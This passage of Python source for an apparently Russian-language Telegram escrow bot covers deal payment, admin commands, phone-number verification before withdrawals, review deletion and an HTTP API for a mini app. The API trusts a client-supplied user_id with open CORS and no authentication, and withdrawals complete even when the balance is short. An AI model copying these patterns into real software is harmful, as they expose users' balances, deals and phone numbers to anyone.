    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ {get_text(lang, 'access_denied')}!\n\n"
            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
        )
        add_log("unauthorized_deal_attempt", {
            "user_id": message.from_user.id,
            "username": message.from_user.username,
            "deal_id": deal_id,
            "expected_buyer": deal["buyer_username"]
        })
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)
    
    add_log("buyer_entered_deal", {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "deal_id": deal_id,
        "product": deal["product"],
        "amount": deal["amount"],
        "currency": deal["currency"]
    })

    await message.answer(
        f"✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>\n\n"
        f"📦 {get_text(lang, 'product')}: {deal['product']}\n"
        f"💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
        f"👤 {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n"
        f"⬇️ {get_text(lang, 'choose_payment_method')} ⬇️",
        reply_markup=payment_method_keyboard(deal_id, message.from_user.id)
    )

@dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
async def pay_by_rekvisits(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    
    add_log("user_viewed_rekvisits", {
        "user_id": callback.from_user.id,
        "username": callback.from_user.username,
        "deal_id": deal_id,
        "amount": deal["amount"],
        "currency": deal["currency"]
    })
    
    await callback.message.edit_text(
        f"💳 <b>{get_text(lang, 'payment_details')}</b>\n\n"
        f"Оплатите {deal['amount']} {deal['currency']}\n"
        f"После оплаты напишите админу: /pay {deal_id}",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
async def pay_by_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    
    buyer_balance = get_balance(callback.from_user.id)
    curr_key = deal["currency"].lower()
    if buyer_balance.get(curr_key, 0) < deal["amount"]:
        await callback.answer(f"❌ {get_text(lang, 'insufficient_balance')}!", show_alert=True)
        add_log("insufficient_balance_payment_attempt", {
            "user_id": callback.from_user.id,
            "username": callback.from_user.username,
            "deal_id": deal_id,
            "amount": deal["amount"],
            "currency": deal["currency"],
            "balance": buyer_balance.get(curr_key, 0)
        })
        return
    
    buyer_balance[curr_key] -= deal["amount"]
    save_json(FILES["balance"], balance)
    deal["status"] = "paid"
    deal["paid_by_admin"] = callback.from_user.id
    save_json(FILES["deals"], deals)
    
    add_log("deal_paid_by_balance", {
        "user_id": callback.from_user.id,
        "username": callback.from_user.username,
        "deal_id": deal_id,
        "amount": deal["amount"],
        "currency": deal["currency"]
    })
    
    await callback.message.edit_text(
        f"✅ {get_text(lang, 'payment_confirmed')}!\n\n"
        f"{get_text(lang, 'deal')} #{deal_id}\n"
        f"💰 {get_text(lang, 'funds_deducted')}: {deal['amount']} {deal['currency']}",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    
    try:
        seller_lang = get_user_language(deal["seller_id"])
        await bot.send_message(
            deal["seller_id"],
            f"💎 <b>{get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}!</b>\n\n"
            f"💰 {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
            f"👤 {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n"
            f"⬇️ {get_text(seller_lang, 'seller_delivered')} ⬇️",
            reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
        )
    except Exception as e:
        print(f"Error: {e}")
    
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_done(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer(f"⏳ {get_text(lang, 'status_waiting')}")
        return
    deal["status"] = "awaiting_confirmation"
    save_json(FILES["deals"], deals)
    
    add_log("seller_confirmed_delivery", {
        "user_id": callback.from_user.id,
        "username": callback.from_user.username,
        "deal_id": deal_id,
        "product": deal["product"],
        "amount": deal["amount"],
        "currency": deal["currency"],
        "buyer": deal["buyer_username"]
    })
    
    try:
        await callback.message.edit_text(
            f"✅ {get_text(lang, 'seller_confirmed')}!\n\n"
            f"⏳ {get_text(lang, 'waiting_for_delivery')}"
        )
    except:
        await callback.message.answer(
            f"✅ {get_text(lang, 'seller_confirmed')}!"
        )
    
    try:
        buyer_lang = get_user_language(deal["buyer_id"])
        await bot.send_message(
            deal["buyer_id"],
            f"📦 <b>{get_text(buyer_lang, 'seller_delivered')} {get_text(buyer_lang, 'deal')} #{deal_id}</b>\n\n"
            f"💰 {get_text(buyer_lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
            f"👤 {get_text(buyer_lang, 'seller')}: @{deal['seller_username']}\n\n"
            f"⬇️ {get_text(buyer_lang, 'confirm_receipt')} ⬇️",
            reply_markup=buyer_confirm_keyboard(deal_id, deal["buyer_id"])
        )
    except:
        pass
    
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer(f"⏳ {get_text(lang, 'status_waiting')}")
        return
    
    add_balance(deal["seller_id"], deal["currency"], deal["amount"])
    seller_balance = get_balance(deal["seller_id"])
    buyer = deal["buyer_username"]
    if buyer not in seller_balance["deal_partners"]:
        seller_balance["deal_partners"][buyer] = 0
    seller_balance["deal_partners"][buyer] += 1
    save_json(FILES["balance"], balance)
    
    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_json(FILES["deals"], deals)
    
    add_log("deal_completed", {
        "user_id": callback.from_user.id,
        "username": callback.from_user.username,
        "deal_id": deal_id,
        "product": deal["product"],
        "amount": deal["amount"],
        "currency": deal["currency"],
        "seller": deal["seller_username"],
        "buyer": deal["buyer_username"],
        "completed_at": deal["completed_at"]
    })
    
    await callback.message.edit_text(
        f"🎉 <b>{get_text(lang, 'deal_completed')}</b> #{deal_id}!\n\n"
        f"💳 {get_text(lang, 'funds_added_to_balance')} {deal['amount']} {deal['currency']}\n\n"
        f"{get_text(lang, 'deal_completed_msg')}",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    
    try:
        seller_lang = get_user_language(deal["seller_id"])
        await bot.send_message(
            deal["seller_id"],
            f"🎉 <b>{get_text(seller_lang, 'deal_completed')}</b> #{deal_id}!\n\n"
            f"💰 {deal['amount']} {deal['currency']} {get_text(seller_lang, 'funds_added_to_balance')}"
        )
    except:
        pass
    
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("support_"))
async def support_callback(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.answer()
    await callback.message.answer(
        f"🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}"
    )

# ============================================================
# 12. АДМИН ПАНЕЛЬ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(
        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 13. НАЧИСЛИТЬ БАЛАНС
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(f"💰 <b>{get_text(lang, 'balance_added')}</b>\n\n{get_text(lang, 'enter_user_id')}:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer(f"💱 {get_text(lang, 'choose_currency')}:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    currency = callback.data.split("_")[1]
    await state.update_data(target_currency=currency)
    await callback.message.edit_text(f"💰 {get_text(lang, 'enter_amount')} {currency}:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        target_user_id = data.get("target_user_id")
        currency = data.get("target_currency")
        add_balance(target_user_id, currency, amount)
        add_log("admin_add_balance", {
            "admin": message.from_user.username,
            "target_user_id": target_user_id,
            "amount": amount,
            "currency": currency
        })
        await message.answer(
            f"✅ {get_text(lang, 'balance_added')} {amount} {currency} {get_text(lang, 'for_user')} {target_user_id}",
            reply_markup=admin_panel_keyboard(message.from_user.id)
        )
        await state.clear()
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

# ============================================================
# 14. УПРАВЛЕНИЕ АДМИНАМИ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
    await callback.message.edit_text(
        f"👥 <b>{get_text(lang, 'admin_list')}</b>\n\n"
        f"Главный админ: {MASTER_ADMIN_ID}\n"
        f"Дополнительные:\n{admin_list}\n\n"
        f"/add_admin [ID] - {get_text(lang, 'admin_added')}\n"
        f"/remove_admin [ID] - {get_text(lang, 'admin_removed')}",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /add_admin [ID]")
        return
    try:
        new_admin_id = int(args[1])
        admins[str(new_admin_id)] = True
        save_json(FILES["admins"], admins)
        add_log("admin_added", {
            "admin": message.from_user.username,
            "new_admin_id": new_admin_id
        })
        await message.answer(f"✅ {get_text(lang, 'admin_added')} {new_admin_id}")
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /remove_admin [ID]")
        return
    try:
        admin_id = int(args[1])
        if admin_id == MASTER_ADMIN_ID:
            await message.answer(f"❌ {get_text(lang, 'cannot_remove_master')}")
            return
        if str(admin_id) in admins:
            del admins[str(admin_id)]
            save_json(FILES["admins"], admins)
            add_log("admin_removed", {
                "admin": message.from_user.username,
                "removed_admin_id": admin_id
            })
            await message.answer(f"✅ {get_text(lang, 'admin_removed')} {admin_id}")
        else:
            await message.answer(f"❌ {get_text(lang, 'user_not_found')}")
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

# ============================================================
# 15. ВСЕ СДЕЛКИ (АДМИН)
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    if not deals:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals_total')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"📊 <b>{get_text(lang, 'all_deals_title')}</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 16. ЗАЯВКИ НА ВЫВОД (АДМИН)
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"💲 <b>Заявки на вывод</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')} (@{req.get('username', '?')})\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 17. ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН)
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_verification_requests")
async def admin_verification_requests(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text(f"🔐 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"🔐 <b>Запросы верификации</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n   👤 @{req.get('username', '?')} (ID: {req.get('user_id', '?')})\n"
        text += f"   📱 {req.get('phone', '?')}\n"
        text += f"   ➡️ /approve_verification {rid}\n"
        text += f"   ➡️ /reject_verification {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.message(Command("approve_verification"))
async def approve_verification(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /approve_verification [ID]")
        return
    request_id = args[1]
    if request_id not in verification_requests:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    req = verification_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
        return
    
    session_id = str(uuid.uuid4())[:8]
    verification_sessions[session_id] = {
        "user_id": req["user_id"],
        "username": req["username"],
        "phone": req["phone"],
        "created_at": datetime.now().isoformat(),
        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
        "active": True
    }
    save_json(FILES["verification_sessions"], verification_sessions)
    
    req["status"] = "approved"
    req["session_id"] = session_id
    req["approved_at"] = datetime.now().isoformat()
    save_json(FILES["verification"], verification_requests)
    
    add_log("verification_approved", {
        "admin": message.from_user.username,
        "user_id": req["user_id"],
        "username": req["username"],
        "phone": req["phone"],
        "session_id": session_id
    })
    
    await message.answer(f"✅ {get_text(lang, 'photo_updated')} #{request_id}")
    
    try:
        user_lang = get_user_language(req["user_id"])
        await bot.send_message(
            req["user_id"],
            f"✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
            f"🕐 Сессия активна 24 часа.\n"
            f"🆔 ID сессии: {session_id}\n\n"
            f"💰 Теперь вам доступен вывод средств!"
        )
    except:
        pass

@dp.message(Command("reject_verification"))
async def reject_verification(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /reject_verification [ID]")
        return
    request_id = args[1]
    if request_id not in verification_requests:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    req = verification_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
        return
    
    req["status"] = "rejected"
    req["rejected_at"] = datetime.now().isoformat()
    save_json(FILES["verification"], verification_requests)
    
    add_log("verification_rejected", {
        "admin": message.from_user.username,
        "user_id": req["user_id"],
        "username": req["username"]
    })
    
    await message.answer(f"❌ Запрос #{request_id} отклонён")

# ============================================================
# 18. УПРАВЛЕНИЕ ОТЗЫВАМИ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
async def admin_manage_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    reviews_list = list(reviews.values())
    if not reviews_list:
        await callback.message.edit_text(f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\n"
    for r in reviews_list[-10:]:
        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
        text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
    await callback.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"🗑 Очистить все отзывы", callback_data="admin_clear_reviews")],
            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
        ])
    )
    await callback.answer()

@dp.message(Command("delete_review"))
async def delete_review_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /delete_review [ID]")
        return
    review_id = args[1]
    if review_id not in reviews:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    del reviews[review_id]
    save_json(FILES["reviews"], reviews)
    add_log("review_deleted", {
        "admin": message.from_user.username,
        "review_id": review_id
    })
    await message.answer(f"✅ {get_text(lang, 'photo_updated')}")

@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
async def admin_clear_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    reviews.clear()
    save_json(FILES["reviews"], reviews)
    add_log("all_reviews_cleared", {
        "admin": callback.from_user.username
    })
    await callback.message.edit_text(f"✅ {get_text(lang, 'photo_updated')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 19. ЛОГИ (АДМИН)
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    logs_list = list(logs.values())[-20:]
    if not logs_list:
        await callback.message.edit_text(f"📋 <b>Логи</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "📋 <b>Последние логи</b>\n\n"
    for log_entry in reversed(logs_list[-10:]):
        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
        text += f"📌 {log_entry.get('action', '')}\n"
        text += f"📊 {json.dumps(log_entry.get('data', {}), ensure_ascii=False)[:80]}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 20. КОМАНДЫ АДМИНА
# ============================================================
@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /pay [ID]")
        return
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_json(FILES["deals"], deals)
    
    add_log("deal_paid_by_admin", {
        "admin": message.from_user.username,
        "deal_id": deal_id,
        "amount": deal["amount"],
        "currency": deal["currency"]
    })
    
    await message.answer(f"✅ {get_text(lang, 'payment_confirmed')} #{deal_id}")
    
    try:
        seller_lang = get_user_language(deal["seller_id"])
        await bot.send_message(
            deal["seller_id"],
            f"💎 <b>{get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}!</b>\n\n"
            f"💰 {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
            f"👤 {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n"
            f"⬇️ {get_text(seller_lang, 'seller_delivered')} ⬇️",
            reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
        )
    except Exception as e:
        print(f"Error: {e}")

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /confirm_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
        return
    bal = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if bal.get(curr_key, 0) >= req["amount"]:
        bal[curr_key] -= req["amount"]
        save_json(FILES["balance"], balance)
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["withdraw"], withdraw_requests)
    
    add_log("withdraw_confirmed", {
        "admin": message.from_user.username,
        "request_id": request_id,
        "user_id": req["user_id"],
        "username": req.get("username", "?"),
        "amount": req["amount"],
        "currency": req["currency"]
    })
    
    await message.answer(f"✅ {get_text(lang, 'withdraw_completed')} #{request_id}")
    try:
        await bot.send_message(
            req["user_id"],
            f"✅ <b>{get_text(lang, 'withdraw_completed')}</b>\n\n"
            f"💰 {req['amount']} {req['currency']}"
        )
    except:
        pass

@dp.message(Command("reject_withdraw"))
async def reject_withdraw_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /reject_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
        return
    req["status"] = "rejected"
    save_json(FILES["withdraw"], withdraw_requests)
    
    add_log("withdraw_rejected", {
        "admin": message.from_user.username,
        "request_id": request_id,
        "user_id": req["user_id"]
    })
    
    await message.answer(f"❌ Заявка #{request_id} отклонена")

# ============================================================
# 21. API ДЛЯ MINI APP
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    if request.method == 'GET':
        return web.json_response({
            'success': True,
            'bot': BOT_NAME,
            'version': '1.0.0',
            'status': 'running'
        }, headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    username = data.get('username', str(user_id))
    endpoint = request.path
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        payment_method = data.get('payment_method', 'balance')
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "payment_method": payment_method,
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        
        add_log("api_create_deal", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "product": product,
            "amount": amount,
            "currency": currency,
            "buyer_username": buyer_username
        })
        
        if payment_method == 'balance':
            buyer_balance = get_balance(user_id)
            curr_key = currency.lower()
            if buyer_balance.get(curr_key, 0) >= amount:
                buyer_balance[curr_key] -= amount
                save_json(FILES["balance"], balance)
                deals[deal_id]["status"] = "paid"
                deals[deal_id]["paid_by_admin"] = user_id
                save_json(FILES["deals"], deals)
                
                add_log("api_deal_paid_from_balance", {
                    "user_id": user_id,
                    "username": username,
                    "deal_id": deal_id,
                    "amount": amount,
                    "currency": currency
                })
                
                try:
                    seller_lang = get_user_language(user_id)
                    await bot.send_message(
                        user_id,
                        f"💎 <b>{get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}!</b>\n\n"
                        f"💰 {get_text(seller_lang, 'amount')}: {amount} {currency}\n"
                        f"👤 {get_text(seller_lang, 'buyer')}: @{buyer_username}\n\n"
                        f"⬇️ {get_text(seller_lang, 'seller_delivered')} ⬇️",
                        reply_markup=seller_confirm_keyboard(deal_id, user_id)
                    )
                except:
                    pass
            else:
                deals[deal_id]["status"] = "waiting_payment"
                save_json(FILES["deals"], deals)
        
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link,
            'status': deals[deal_id]["status"]
        }, headers=headers)
    
    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # ===== ОТЗЫВЫ =====
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    # ===== ДОБАВИТЬ ОТЗЫВ (БЕЗ ВЕРИФИКАЦИИ) =====
